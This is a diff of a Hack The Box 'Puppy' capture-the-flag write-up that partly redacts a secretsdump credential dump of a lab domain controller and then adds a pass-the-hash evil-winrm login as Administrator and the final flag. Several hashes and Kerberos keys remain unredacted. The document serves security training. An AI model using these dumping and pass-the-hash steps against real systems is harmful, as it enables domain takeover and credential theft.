@@ -491,21 +491,21 @@ Output
 [*] Starting service RemoteRegistry
 [*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
+Administrator:500:aad3b{REDACTED}ee:9c541c3{REDACTED}333d:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
 [*] Dumping cached domain logon information (domain/username:hash)
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC 
-PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
+PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f093{REDACTED}5d9ec85ebda45
 PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
 PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
-PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
-PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
+PUPPY\DC$:plain_password_hex:84880c04e89244{REDACTED}3d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
+PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d504{REDACTED}c8df:::
 [*] DPAPI_SYSTEM 
-dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
-dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
+dpapi_machinekey:0xc21ea{REDACTED}96a3
+dpapi_userkey:0xcb6a80{REDACTED}e29bf
 [*] NL$KM 
  0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
  0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
@@ -514,16 +514,16 @@ dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
 NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
+Administrator:500:aad3b4{REDACTED}ee:bb0edc1{REDACTED}6e65d75b:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
-PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
-PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
-PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
-PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
-PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
-PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
-DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
+PUPPY.HTB\levi.james:1103:aad{REDACTED}b435b51404ee:ff42{REDACTED}093995466570f435b8:::
+PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac88{REDACTED}2b34f438058b:::
+PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07{REDACTED}fb1d0953812d66:::
+PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a0{REDACTED}213fc8e3c7fca780:::
+PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f{REDATED}1a8613f09200b:::
+PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb2{REDACTED}3502039b80f3f1173:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:d50479{REDACTED}19c8df:::
 [*] Kerberos keys grabbed
 Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
 Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
@@ -562,4 +562,10 @@ We got the hashes of most of the users including the Administrator
 We can use the PTH attack using EVILwinRM to get the root flag
 ```bash
 Evil-winrm -i puppy.htb -u 'administrator' -H 'bb0edc1{REDACTED}6e65d75b'
+```
+![[Puppy14.png]]
+Final Flag!
+### Flag2
+```bash
+89879{REDACTED}cfdbe3
 ```
